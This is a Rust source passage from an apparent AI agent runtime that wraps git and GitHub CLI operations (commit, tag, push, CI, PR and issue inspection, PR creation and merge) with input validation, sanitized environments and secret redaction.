        let new_head_sha = if head_out.status.success() {
            String::from_utf8_lossy(&head_out.stdout).trim().to_string()
        } else {
            "UNBORN".to_string()
        };

        if let Some(ref tag) = plan.tag {
            let mut tag_args = vec!["tag".to_string()];
            if plan.force_tag {
                tag_args.push("-f".to_string());
            }
            tag_args.push("--".to_string());
            tag_args.push(tag.clone());
            tag_args.push("HEAD".to_string());
            let tag_out = run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &tag_args)?;
            if !tag_out.status.success() {
                bail!(
                    "git tag '{}' failed: {}",
                    tag,
                    String::from_utf8_lossy(&tag_out.stderr).trim()
                );
            }
        }

        let mut pushed_refs = Vec::new();
        if plan.push {
            if let Some(ref branch) = plan.push_branch {
                let refspec = format!("refs/heads/{branch}:refs/heads/{branch}");
                let mut push_args = vec!["push".to_string()];
                if plan.force_push {
                    push_args.push("--force-with-lease".to_string());
                }
                push_args.extend(["--".to_string(), plan.remote.clone(), refspec]);
                let push_out =
                    run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &push_args)?;
                if !push_out.status.success() {
                    bail!(
                        "git push branch '{}' failed: {}",
                        branch,
                        String::from_utf8_lossy(&push_out.stderr).trim()
                    );
                }
                pushed_refs.push(format!("refs/heads/{branch}"));
            }
            if let Some(ref tag) = plan.tag {
                let mut push_tag_args = vec!["push".to_string()];
                if plan.force_tag {
                    push_tag_args.push("--force".to_string());
                }
                push_tag_args.push("--".to_string());
                push_tag_args.push(plan.remote.clone());
                push_tag_args.push(format!("refs/tags/{tag}:refs/tags/{tag}"));
                let push_tag_out =
                    run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &push_tag_args)?;
                if !push_tag_out.status.success() {
                    bail!(
                        "git push tag '{}' failed: {}",
                        tag,
                        String::from_utf8_lossy(&push_tag_out.stderr).trim()
                    );
                }
                pushed_refs.push(format!("refs/tags/{tag}"));
            }
        }

        Ok(json!({
            "status": "git_completed",
            "host_root": plan.host_root,
            "head_sha": new_head_sha,
            "shadow_committed_files": shadow_committed,
            "verified_shadow": verified_shadow,
            "checked_out_branch": checked_out_branch,
            "synced": synced_mode,
            "committed": plan.commit_message.is_some(),
            "committed_files": plan.paths,
            "tag": plan.tag,
            "force_tag": plan.force_tag,
            "force_push": plan.force_push,
            "pushed": plan.push,
            "remote": (plan.push || plan.sync_mode.is_some()).then_some(plan.remote),
            "remote_url": plan.remote_url,
            "pushed_refs": pushed_refs,
            "evidence_hash": plan.evidence_hash,
        }))
    })
    .await?;

    if need_shadow_refresh && git_result.is_ok() {
        let _ = env.workspace.refresh_from_host().await;
    }
    git_result
}

fn is_safe_git_rev_arg(rev: &str) -> bool {
    !rev.is_empty()
        && rev.len() <= 128
        && !rev.starts_with('-')
        && !rev.contains('\0')
        && !rev.chars().any(|c| c.is_whitespace() || c.is_control())
}

fn truncate_utf8_bytes(s: &str, max_bytes: usize) -> (String, bool) {
    if s.len() <= max_bytes {
        return (s.to_string(), false);
    }
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    (s[..end].to_string(), true)
}

async fn execute_workspace_git_inspect(
    env: &AgentEnvironment,
    args: &Value,
) -> anyhow::Result<Value> {
    let host_root = std::fs::canonicalize(env.workspace.host_source_root())
        .unwrap_or_else(|_| env.workspace.host_source_root().to_path_buf());
    if !host_root.join(".git").exists() {
        bail!("Host workspace '{}' is not a Git repository", host_root.display());
    }
    let git_bin = resolve_system_git_binary()?;
    let mode = args
        .get("mode")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or("status")
        .to_string();
    let limit = args
        .get("limit")
        .and_then(|v| v.as_u64())
        .unwrap_or(20)
        .clamp(1, 100) as usize;
    let rev = match args
        .get("rev")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        Some(r) => {
            if !is_safe_git_rev_arg(r) {
                bail!("Invalid Git revision/range '{}'", r);
            }
            Some(r.to_string())
        }
        None => None,
    };
    let paths_raw: Vec<String> = args
        .get("paths")
        .and_then(|v| serde_json::from_value(v.clone()).ok())
        .unwrap_or_default();
    let paths = validate_repo_relative_paths(paths_raw, "workspace_git_inspect")?;

    let shadow_uncommitted = env
        .workspace
        .changed_since_baseline()
        .await
        .unwrap_or_default();

    let mode_clone = mode.clone();
    let host_root_clone = host_root.clone();
    let (raw_output, truncated) = tokio::task::spawn_blocking(move || -> anyhow::Result<(String, bool)> {
        let mut git_args: Vec<String> = match mode_clone.as_str() {
            "status" => vec!["status".to_string(), "--short".to_string(), "--branch".to_string()],
            "branch" => vec!["branch".to_string(), "-vv".to_string(), "--all".to_string()],
            "log" => vec![
                "log".to_string(),
                "-n".to_string(),
                limit.to_string(),
                "--oneline".to_string(),
                "--decorate".to_string(),
            ],
            "diff" => vec![
                "diff".to_string(),
                "--no-ext-diff".to_string(),
                "--no-textconv".to_string(),
            ],
            "tag" => vec![
                "tag".to_string(),
                "-l".to_string(),
                "--sort=-creatordate".to_string(),
            ],
            "remote" => vec!["remote".to_string(), "-v".to_string()],
            "show" => vec![
                "show".to_string(),
                "--stat".to_string(),
                "--no-ext-diff".to_string(),
                "--no-textconv".to_string(),
            ],
            other => bail!(
                "Unsupported workspace_git_inspect mode '{}'; expected one of status, branch, log, diff, tag, remote, show",
                other
            ),
        };
        if matches!(mode_clone.as_str(), "log" | "diff" | "show") {
            if let Some(ref r) = rev {
                git_args.push(r.clone());
            } else if mode_clone == "show" {
                git_args.push("HEAD".to_string());
            }
        }
        if !paths.is_empty() && matches!(mode_clone.as_str(), "status" | "log" | "diff" | "show") {
            git_args.push("--".to_string());
            git_args.extend(paths);
        }
        let out = run_sanitized_host_git(&git_bin, &host_root_clone, &[], &git_args)?;
        if !out.status.success() {
            bail!(
                "git {} failed: {}",
                mode_clone,
                redact_dlp_secrets(String::from_utf8_lossy(&out.stderr).trim()).0
            );
        }
        let stdout_s = String::from_utf8_lossy(&out.stdout);
        let (scrubbed, _) = redact_dlp_secrets(&stdout_s);
        Ok(truncate_utf8_bytes(&scrubbed, 64 * 1024))
    })
    .await??;

    Ok(json!({
        "status": "ok",
        "mode": mode,
        "host_root": host_root,
        "truncated": truncated,
        "output": raw_output,
        "shadow_uncommitted_files": shadow_uncommitted,
    }))
}

fn is_valid_github_repo_slug(slug: &str) -> bool {
    let mut parts = slug.split('/');
    let (Some(owner), Some(repo), None) = (parts.next(), parts.next(), parts.next()) else {
        return false;
    };
    let valid_part = |s: &str| -> bool {
        !s.is_empty()
            && s.len() <= 100
            && s != "."
            && s != ".."
            && !s.starts_with('-')
            && !s.contains("..")
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
    };
    valid_part(owner) && valid_part(repo)
}

fn extract_github_slug_from_remote_url(raw_url: &str) -> Option<String> {
    let trimmed = raw_url.trim().trim_end_matches('/');
    let path_part = if let Some(rest) = trimmed
        .strip_prefix("https://github.com/")
        .or_else(|| trimmed.strip_prefix("http://github.com/"))
        .or_else(|| trimmed.strip_prefix("ssh://git@github.com/"))
        .or_else(|| trimmed.strip_prefix("git://github.com/"))
    {
        rest
    } else if let Some(rest) = trimmed.strip_prefix("git@github.com:") {
        rest
    } else {
        return None;
    };
    let cleaned = path_part.strip_suffix(".git").unwrap_or(path_part).trim_end_matches('/');
    is_valid_github_repo_slug(cleaned).then(|| cleaned.to_string())
}

fn detect_github_repo_from_git_config(host_root: &Path) -> Option<String> {
    let raw = std::fs::read_to_string(host_root.join(".git/config")).ok()?;
    let mut in_origin = false;
    let mut any_github = None;
    for line in raw.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            in_origin = trimmed == "[remote \"origin\"]";
            continue;
        }
        if let Some((k, v)) = trimmed.split_once('=') {
            if k.trim() == "url" {
                if let Some(slug) = extract_github_slug_from_remote_url(v.trim()) {
                    if in_origin {
                        return Some(slug);
                    }
                    if any_github.is_none() {
                        any_github = Some(slug);
                    }
                }
            }
        }
    }
    any_github
}

fn is_valid_ci_branch_name(branch: &str) -> bool {
    !branch.is_empty()
        && branch.len() <= 128
        && !branch.starts_with('-')
        && !branch.starts_with('/')
        && !branch.ends_with('/')
        && !branch.contains("..")
        && branch
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/'))
}

fn redact_ci_log_secrets(text: &str) -> String {
    redact_dlp_secrets(text).0
}

fn redact_json_strings(val: &mut Value) {
    match val {
        Value::String(s) => {
            let (scrubbed, hits) = redact_dlp_secrets(s);
            if !hits.is_empty() {
                *s = scrubbed;
            }
        }
        Value::Array(arr) => {
            for item in arr.iter_mut() {
                redact_json_strings(item);
            }
        }
        Value::Object(map) => {
            for (_k, v) in map.iter_mut() {
                redact_json_strings(v);
            }
        }
        _ => {}
    }
}

fn resolve_github_repo_arg(host_root: &Path, args: &Value) -> anyhow::Result<String> {
    match args
        .get("repo")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        Some(explicit) => {
            if !is_valid_github_repo_slug(explicit) {
                bail!(
                    "Invalid GitHub repository slug '{}'; expected `owner/repo`",
                    explicit
                );
            }
            Ok(explicit.to_string())
        }
        None => detect_github_repo_from_git_config(host_root).context(
            "Could not auto-detect GitHub `owner/repo` from host `.git/config`; pass `repo` explicitly",
        ),
    }
}

fn tail_ci_lines(text: &str, max_lines: usize) -> (String, usize, bool) {
    let lines: Vec<&str> = text.lines().collect();
    let total = lines.len();
    let truncated = total > max_lines;
    let slice = if truncated {
        &lines[total - max_lines..]
    } else {
        &lines[..]
    };
    (slice.join("\n"), total, truncated)
}

fn resolve_system_gh_binary() -> Option<PathBuf> {
    for candidate in ["/opt/homebrew/bin/gh", "/usr/local/bin/gh", "/usr/bin/gh"] {
        let p = PathBuf::from(candidate);
        if p.is_file() {
            return Some(p);
        }
    }
    let path_os = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path_os) {
        let ds = dir.to_string_lossy();
        if ds.contains("/.aegis/bin") || ds.contains("/.aegis-bin") {
            continue;
        }
        let p = dir.join("gh");
        if p.is_file() {
            return Some(p);
        }
    }
    None
}

fn run_sanitized_gh(gh_bin: &Path, args: &[&str]) -> anyhow::Result<std::process::Output> {
    let mut cmd = std::process::Command::new(gh_bin);
    for var in [
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "DYLD_FRAMEWORK_PATH",
    ] {
        cmd.env_remove(var);
    }
    cmd.env("GH_PROMPT_DISABLED", "1")
        .env("NO_COLOR", "1")
        .env("GIT_TERMINAL_PROMPT", "0")
        .args(args);
    cmd.output()
        .with_context(|| format!("executing {} {:?}", gh_bin.display(), args))
}

fn github_rest_get_json(url: &str) -> anyhow::Result<Value> {
    let agent = ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(10))
        .user_agent("aegis-os-ci-inspect")
        .build();
    let resp = agent
        .get(url)
        .set("Accept", "application/vnd.github+json")
        .call()
        .map_err(|e| anyhow::anyhow!("GitHub REST API GET {} failed: {}", url, e))?;
    Ok(resp.into_json()?)
}

async fn execute_github_ci_inspect(host_root: &Path, args: &Value) -> anyhow::Result<Value> {
    let repo = resolve_github_repo_arg(host_root, args)?;

    let run_id = args.get("run_id").and_then(|v| v.as_u64());
    let job_id = args.get("job_id").and_then(|v| v.as_u64());
    let branch = match args
        .get("branch")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        Some(b) => {
            if !is_valid_ci_branch_name(b) {
                bail!("Invalid branch name '{}'", b);
            }
            Some(b.to_string())
        }
        None => None,
    };
    let limit = args
        .get("limit")
        .and_then(|v| v.as_u64())
        .unwrap_or(8)
        .clamp(1, 20) as usize;
    let failed_only = args
        .get("failed_only")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let tail_lines = args
        .get("tail_lines")
        .and_then(|v| v.as_u64())
        .unwrap_or(120)
        .clamp(1, 400) as usize;

    let mut val = tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh_bin = resolve_system_gh_binary();

        if let Some(jid) = job_id {
            if let Some(ref gh) = gh_bin {
                let log_endpoint = format!("repos/{repo}/actions/jobs/{jid}/logs");
                if let Ok(log_out) = run_sanitized_gh(gh, &["api", &log_endpoint]) {
                    if log_out.status.success() {
                        let raw = String::from_utf8_lossy(&log_out.stdout);
                        let redacted = redact_ci_log_secrets(&raw);
                        let (tail, total_lines, truncated) = tail_ci_lines(&redacted, tail_lines);
                        let meta = run_sanitized_gh(
                            gh,
                            &["api", &format!("repos/{repo}/actions/jobs/{jid}")],
                        )
                        .ok()
                        .filter(|o| o.status.success())
                        .and_then(|o| serde_json::from_slice::<Value>(&o.stdout).ok());
                        return Ok(json!({
                            "source": "gh_cli",
                            "repo": repo,
                            "job_id": jid,
                            "job": meta,
                            "total_log_lines": total_lines,
                            "truncated": truncated,
                            "log_tail": tail,
                        }));
                    }
                }
            }
            let job_url = format!("https://api.github.com/repos/{repo}/actions/jobs/{jid}");
            let ann_url = format!("https://api.github.com/repos/{repo}/check-runs/{jid}/annotations");
            let job = github_rest_get_json(&job_url)?;
            let annotations = github_rest_get_json(&ann_url).unwrap_or_else(|_| json!([]));
            return Ok(json!({
                "source": "github_rest_api_public",
                "repo": repo,
                "job_id": jid,
                "job": job,
                "annotations": annotations,
                "note": "Raw Actions job logs require authenticated `gh` on the host; structured job steps and annotations returned.",
            }));
        }

        if let Some(rid) = run_id {
            if let Some(ref gh) = gh_bin {
                let rid_str = rid.to_string();
                let view_out = run_sanitized_gh(
                    gh,
                    &[
                        "run",
                        "view",
                        &rid_str,
                        "-R",
                        &repo,
                        "--json",
                        "status,conclusion,name,headSha,headBranch,event,url,jobs",
                    ],
                )?;
                if view_out.status.success() {
                    let meta: Value = serde_json::from_slice(&view_out.stdout)
                        .unwrap_or_else(|_| json!({}));
                    let log_flag = if failed_only { "--log-failed" } else { "--log" };
                    let log_out = run_sanitized_gh(
                        gh,
                        &["run", "view", &rid_str, "-R", &repo, log_flag],
                    )?;
                    let log_raw = if log_out.status.success() {
                        String::from_utf8_lossy(&log_out.stdout).to_string()
                    } else {
                        String::from_utf8_lossy(&log_out.stderr).to_string()
                    };
                    let redacted = redact_ci_log_secrets(&log_raw);
                    let (tail, total_lines, truncated) = tail_ci_lines(&redacted, tail_lines);
                    return Ok(json!({
                        "source": "gh_cli",
                        "repo": repo,
                        "run_id": rid,
                        "failed_only": failed_only,
                        "run": meta,
                        "total_log_lines": total_lines,
                        "truncated": truncated,
                        "log_tail": tail,
                    }));
                }
            }

            let run_url = format!("https://api.github.com/repos/{repo}/actions/runs/{rid}");
            let jobs_url = format!("https://api.github.com/repos/{repo}/actions/runs/{rid}/jobs");
            let run = github_rest_get_json(&run_url)?;
            let jobs = github_rest_get_json(&jobs_url)?;
            let mut failed_annotations = Vec::new();
            if let Some(arr) = jobs.get("jobs").and_then(|v| v.as_array()) {
                for j in arr {
                    if j.get("conclusion").and_then(|v| v.as_str()) == Some("failure") {
                        if let Some(jid) = j.get("id").and_then(|v| v.as_u64()) {
                            let ann_url = format!(
                                "https://api.github.com/repos/{repo}/check-runs/{jid}/annotations"
                            );
                            if let Ok(ann) = github_rest_get_json(&ann_url) {
                                failed_annotations.push(json!({
                                    "job_id": jid,
                                    "name": j.get("name"),
                                    "annotations": ann,
                                }));
                            }
                        }
                    }
                }
            }
            return Ok(json!({
                "source": "github_rest_api_public",
                "repo": repo,
                "run_id": rid,
                "run": run,
                "jobs": jobs.get("jobs").cloned().unwrap_or_else(|| json!([])),
                "failed_annotations": failed_annotations,
                "note": "Authenticated `gh` CLI unavailable; returned public GitHub Actions job steps and check-run annotations.",
            }));
        }

        if let Some(ref gh) = gh_bin {
            let limit_str = limit.to_string();
            let mut gh_args = vec![
                "run",
                "list",
                "-R",
                repo.as_str(),
                "-L",
                limit_str.as_str(),
                "--json",
                "databaseId,headSha,headBranch,name,status,conclusion,event,createdAt,url",
            ];
            if let Some(ref b) = branch {
                gh_args.push("-b");
                gh_args.push(b.as_str());
            }
            if let Ok(list_out) = run_sanitized_gh(gh, &gh_args) {
                if list_out.status.success() {
                    let runs: Value = serde_json::from_slice(&list_out.stdout)
                        .unwrap_or_else(|_| json!([]));
                    return Ok(json!({
                        "source": "gh_cli",
                        "repo": repo,
                        "branch": branch,
                        "runs": runs,
                    }));
                }
            }
        }

        let mut list_url = format!(
            "https://api.github.com/repos/{repo}/actions/runs?per_page={limit}"
        );
        if let Some(ref b) = branch {
            list_url.push_str(&format!("&branch={b}"));
        }
        let body = github_rest_get_json(&list_url)?;
        let runs: Vec<Value> = body
            .get("workflow_runs")
            .and_then(|v| v.as_array())
            .cloned()
            .unwrap_or_default()
            .into_iter()
            .map(|r| {
                json!({
                    "run_id": r.get("id"),
                    "name": r.get("name"),
                    "head_branch": r.get("head_branch"),
                    "head_sha": r.get("head_sha"),
                    "status": r.get("status"),
                    "conclusion": r.get("conclusion"),
                    "event": r.get("event"),
                    "created_at": r.get("created_at"),
                    "url": r.get("html_url"),
                })
            })
            .collect();
        Ok(json!({
            "source": "github_rest_api_public",
            "repo": repo,
            "branch": branch,
            "runs": runs,
        }))
    })
    .await??;
    redact_json_strings(&mut val);
    Ok(val)
}

async fn execute_github_ci_rerun(plan: GitHubCiRerunPlan) -> anyhow::Result<Value> {
    tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh = resolve_system_gh_binary()
            .context("System `gh` CLI binary is required to rerun GitHub Actions workflows")?;
        let rid_str = plan.run_id.to_string();
        let jid_str = plan.job_id.map(|j| j.to_string());
        let mut gh_args = vec!["run", "rerun", rid_str.as_str(), "-R", plan.repo.as_str()];
        if let Some(ref j) = jid_str {
            gh_args.push("--job");
            gh_args.push(j.as_str());
        } else if plan.failed_only {
            gh_args.push("--failed");
        }
        let out = run_sanitized_gh(&gh, &gh_args)?;
        if !out.status.success() {
            bail!(
                "gh run rerun {} on '{}' failed: {}",
                plan.run_id,
                plan.repo,
                redact_ci_log_secrets(String::from_utf8_lossy(&out.stderr).trim())
            );
        }
        Ok(json!({
            "status": "ci_rerun_triggered",
            "repo": plan.repo,
            "run_id": plan.run_id,
            "failed_only": plan.failed_only,
            "job_id": plan.job_id,
            "message": redact_ci_log_secrets(String::from_utf8_lossy(&out.stdout).trim()),
            "evidence_hash": plan.evidence_hash,
        }))
    })
    .await?
}

async fn execute_github_pr_inspect(host_root: &Path, args: &Value) -> anyhow::Result<Value> {
    let repo = resolve_github_repo_arg(host_root, args)?;
    let pr_number = args.get("pr_number").and_then(|v| v.as_u64());
    let state = match args
        .get("state")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or("open")
    {
        s @ ("open" | "closed" | "merged" | "all") => s.to_string(),
        other => bail!("Invalid PR state '{}'; expected open|closed|merged|all", other),
    };
    let limit = args
        .get("limit")
        .and_then(|v| v.as_u64())
        .unwrap_or(10)
        .clamp(1, 30) as usize;
    let include_comments = args
        .get("include_comments")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let include_checks = args
        .get("include_checks")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let include_diff = args
        .get("include_diff")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    let mut val = tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh_bin = resolve_system_gh_binary();
        if let Some(num) = pr_number {
            if let Some(ref gh) = gh_bin {
                let num_s = num.to_string();
                let mut fields = String::from(
                    "number,title,body,state,isDraft,author,baseRefName,headRefName,mergeable,reviewDecision,url,createdAt,updatedAt",
                );
                if include_comments {
                    fields.push_str(",comments");
                }
                if include_checks {
                    fields.push_str(",statusCheckRollup");
                }
                if let Ok(out) = run_sanitized_gh(
                    gh,
                    &["pr", "view", &num_s, "-R", &repo, "--json", &fields],
                ) {
                    if out.status.success() {
                        let pr: Value =
                            serde_json::from_slice(&out.stdout).unwrap_or_else(|_| json!({}));
                        let mut diff_text: Option<String> = None;
                        let mut diff_truncated = false;
                        if include_diff {
                            if let Ok(d_out) =
                                run_sanitized_gh(gh, &["pr", "diff", &num_s, "-R", &repo])
                            {
                                if d_out.status.success() {
                                    let raw_d = String::from_utf8_lossy(&d_out.stdout);
                                    let (scrubbed, _) = redact_dlp_secrets(&raw_d);
                                    let (capped, trunc) = truncate_utf8_bytes(&scrubbed, 32 * 1024);
                                    diff_text = Some(capped);
                                    diff_truncated = trunc;
                                }
                            }
                        }
                        return Ok(json!({
                            "source": "gh_cli",
                            "repo": repo,
                            "pr_number": num,
                            "pr": pr,
                            "diff": diff_text,
                            "diff_truncated": diff_truncated,
                        }));
                    }
                }
            }
            let pr = github_rest_get_json(&format!(
                "https://api.github.com/repos/{repo}/pulls/{num}"
            ))?;
            let comments = if include_comments {
                github_rest_get_json(&format!(
                    "https://api.github.com/repos/{repo}/issues/{num}/comments?per_page=30"
                ))
                .unwrap_or_else(|_| json!([]))
            } else {
                json!([])
            };
            return Ok(json!({
                "source": "github_rest_api_public",
                "repo": repo,
                "pr_number": num,
                "pr": pr,
                "comments": comments,
            }));
        }

        if let Some(ref gh) = gh_bin {
            let lim_s = limit.to_string();
            if let Ok(out) = run_sanitized_gh(
                gh,
                &[
                    "pr",
                    "list",
                    "-R",
                    &repo,
                    "--state",
                    &state,
                    "-L",
                    &lim_s,
                    "--json",
                    "number,title,state,isDraft,author,headRefName,baseRefName,url,updatedAt",
                ],
            ) {
                if out.status.success() {
                    let prs: Value =
                        serde_json::from_slice(&out.stdout).unwrap_or_else(|_| json!([]));
                    return Ok(json!({
                        "source": "gh_cli",
                        "repo": repo,
                        "state": state,
                        "pulls": prs,
                    }));
                }
            }
        }
        let rest_state = if state == "merged" { "closed" } else { state.as_str() };
        let prs = github_rest_get_json(&format!(
            "https://api.github.com/repos/{repo}/pulls?state={rest_state}&per_page={limit}"
        ))?;
        Ok(json!({
            "source": "github_rest_api_public",
            "repo": repo,
            "state": state,
            "pulls": prs,
        }))
    })
    .await??;
    redact_json_strings(&mut val);
    Ok(val)
}

async fn execute_github_issue_inspect(host_root: &Path, args: &Value) -> anyhow::Result<Value> {
    let repo = resolve_github_repo_arg(host_root, args)?;
    let issue_number = args.get("issue_number").and_then(|v| v.as_u64());
    let state = match args
        .get("state")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or("open")
    {
        s @ ("open" | "closed" | "all") => s.to_string(),
        other => bail!("Invalid issue state '{}'; expected open|closed|all", other),
    };
    let limit = args
        .get("limit")
        .and_then(|v| v.as_u64())
        .unwrap_or(10)
        .clamp(1, 30) as usize;
    let include_comments = args
        .get("include_comments")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    let mut val = tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh_bin = resolve_system_gh_binary();
        if let Some(num) = issue_number {
            if let Some(ref gh) = gh_bin {
                let num_s = num.to_string();
                let mut fields = String::from("number,title,body,state,author,labels,url,createdAt,updatedAt");
                if include_comments {
                    fields.push_str(",comments");
                }
                if let Ok(out) = run_sanitized_gh(
                    gh,
                    &["issue", "view", &num_s, "-R", &repo, "--json", &fields],
                ) {
                    if out.status.success() {
                        let issue: Value =
                            serde_json::from_slice(&out.stdout).unwrap_or_else(|_| json!({}));
                        return Ok(json!({
                            "source": "gh_cli",
                            "repo": repo,
                            "issue_number": num,
                            "issue": issue,
                        }));
                    }
                }
            }
            let issue = github_rest_get_json(&format!(
                "https://api.github.com/repos/{repo}/issues/{num}"
            ))?;
            let comments = if include_comments {
                github_rest_get_json(&format!(
                    "https://api.github.com/repos/{repo}/issues/{num}/comments?per_page=30"
                ))
                .unwrap_or_else(|_| json!([]))
            } else {
                json!([])
            };
            return Ok(json!({
                "source": "github_rest_api_public",
                "repo": repo,
                "issue_number": num,
                "issue": issue,
                "comments": comments,
            }));
        }

        if let Some(ref gh) = gh_bin {
            let lim_s = limit.to_string();
            if let Ok(out) = run_sanitized_gh(
                gh,
                &[
                    "issue",
                    "list",
                    "-R",
                    &repo,
                    "--state",
                    &state,
                    "-L",
                    &lim_s,
                    "--json",
                    "number,title,state,author,labels,url,updatedAt",
                ],
            ) {
                if out.status.success() {
                    let issues: Value =
                        serde_json::from_slice(&out.stdout).unwrap_or_else(|_| json!([]));
                    return Ok(json!({
                        "source": "gh_cli",
                        "repo": repo,
                        "state": state,
                        "issues": issues,
                    }));
                }
            }
        }
        let issues = github_rest_get_json(&format!(
            "https://api.github.com/repos/{repo}/issues?state={state}&per_page={limit}"
        ))?;
        Ok(json!({
            "source": "github_rest_api_public",
            "repo": repo,
            "state": state,
            "issues": issues,
        }))
    })
    .await??;
    redact_json_strings(&mut val);
    Ok(val)
}

async fn execute_github_pr_create(plan: GitHubPrCreatePlan) -> anyhow::Result<Value> {
    tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh = resolve_system_gh_binary()
            .context("System `gh` CLI binary is required to create GitHub Pull Requests")?;
        let mut gh_args = vec![
            "pr",
            "create",
            "-R",
            plan.repo.as_str(),
            "--title",
            plan.title.as_str(),
            "--body",
            plan.body.as_str(),
        ];
        if let Some(ref base) = plan.base {
            gh_args.push("--base");
            gh_args.push(base.as_str());
        }
        if let Some(ref head) = plan.head {
            gh_args.push("--head");
            gh_args.push(head.as_str());
        }
        if plan.draft {
            gh_args.push("--draft");
        }
        let out = run_sanitized_gh(&gh, &gh_args)?;
        if !out.status.success() {
            bail!(
                "gh pr create on '{}' failed: {}",
                plan.repo,
                redact_ci_log_secrets(String::from_utf8_lossy(&out.stderr).trim())
            );
        }
        let url = redact_ci_log_secrets(String::from_utf8_lossy(&out.stdout).trim());
        Ok(json!({
            "status": "pr_created",
            "repo": plan.repo,
            "title": plan.title,
            "base": plan.base,
            "head": plan.head,
            "draft": plan.draft,
            "url": url,
            "evidence_hash": plan.evidence_hash,
        }))
    })
    .await?
}

async fn execute_github_comment_create(plan: GitHubCommentCreatePlan) -> anyhow::Result<Value> {
    tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh = resolve_system_gh_binary()
            .context("System `gh` CLI binary is required to comment on GitHub issues/PRs")?;
        let num_str = plan.number.to_string();
        let gh_args = [
            "issue",
            "comment",
            num_str.as_str(),
            "-R",
            plan.repo.as_str(),
            "--body",
            plan.body.as_str(),
        ];
        let out = run_sanitized_gh(&gh, &gh_args)?;
        if !out.status.success() {
            bail!(
                "gh issue comment #{} on '{}' failed: {}",
                plan.number,
                plan.repo,
                redact_ci_log_secrets(String::from_utf8_lossy(&out.stderr).trim())
            );
        }
        let url = redact_ci_log_secrets(String::from_utf8_lossy(&out.stdout).trim());
        Ok(json!({
            "status": "comment_created",
            "repo": plan.repo,
            "number": plan.number,
            "url": url,
            "evidence_hash": plan.evidence_hash,
        }))
    })
    .await?
}

async fn execute_github_pr_merge(plan: GitHubPrMergePlan) -> anyhow::Result<Value> {
    tokio::task::spawn_blocking(move || -> anyhow::Result<Value> {
        let gh = resolve_system_gh_binary()
            .context("System `gh` CLI binary is required to merge GitHub Pull Requests")?;
        let pr_str = plan.pr_number.to_string();
        let method_flag = match plan.method.as_str() {
            "merge" => "--merge",
            "rebase" => "--rebase",
            _ => "--squash",
        };
        let mut gh_args = vec![
            "pr",
            "merge",
            pr_str.as_str(),
            "-R",
            plan.repo.as_str(),
            method_flag,
        ];
        if plan.delete_branch {
            gh_args.push("--delete-branch");
        }
        if let Some(ref subject) = plan.subject {
            gh_args.push("--subject");
            gh_args.push(subject.as_str());
        }
        if let Some(ref body) = plan.body {
            gh_args.push("--body");
            gh_args.push(body.as_str());
        }
        let out = run_sanitized_gh(&gh, &gh_args)?;
        if !out.status.success() {
            bail!(
                "gh pr merge #{} on '{}' failed: {}",
                plan.pr_number,
                plan.repo,
                redact_ci_log_secrets(String::from_utf8_lossy(&out.stderr).trim())
            );
        }
        let msg = redact_ci_log_secrets(String::from_utf8_lossy(&out.stdout).trim());
        Ok(json!({
            "status": "pr_merged",
            "repo": plan.repo,
            "pr_number": plan.pr_number,
            "method": plan.method,
            "delete_branch": plan.delete_branch,
            "message": msg,
            "evidence_hash": plan.evidence_hash,
        }))
    })
    .await?
}

const PKG_MANIFEST_FILES: &[&str] = &[
    "package.json",
    "package-lock.json",
    "pnpm-lock.yaml",
    "yarn.lock",
    "bun.lockb",
    "bun.lock",
    "pyproject.toml",
    "requirements.txt",
    "uv.lock",
    "Cargo.toml",
    "Cargo.lock",
    "go.mod",
    "go.sum",
];

#[derive(Debug, Clone)]
struct PkgInstallPlan {
    manager: String,
    packages: Vec<String>,
    cwd_rel: String,
    target_dir: PathBuf,
    shadow_root: PathBuf,
    host_root: PathBuf,
    agent_home_dir: PathBuf,
    org_shared_ro_dir: PathBuf,
    org_agent_pub_dir: PathBuf,
    dev: bool,
    allow_scripts: bool,
    offline: bool,
    timeout_ms: u64,
    registry_domains: Vec<String>,
    pre_manifest_hashes: std::collections::BTreeMap<String, String>,
    evidence_hash: String,
}

struct ProxyAbortGuard(Option<tokio::task::JoinHandle<()>>);

impl Drop for ProxyAbortGuard {
    fn drop(&mut self) {
        if let Some(handle) = self.0.take() {
            handle.abort();
        }
    }
}

fn is_safe_package_spec(spec: &str) -> bool {
    if spec.is_empty() || spec.len() > 160 || spec.trim() != spec {
        return false;
    }
    let Some(first) = spec.chars().next() else {
        return false;
    };
    if !(first.is_ascii_alphanumeric() || first == '@') {
        return false;
    }
    if spec.contains("..")
        || spec.contains("://")
        || spec.contains("git+")
        || spec.contains("file:")
        || spec.contains("ssh:")
    {
        return false;
    }
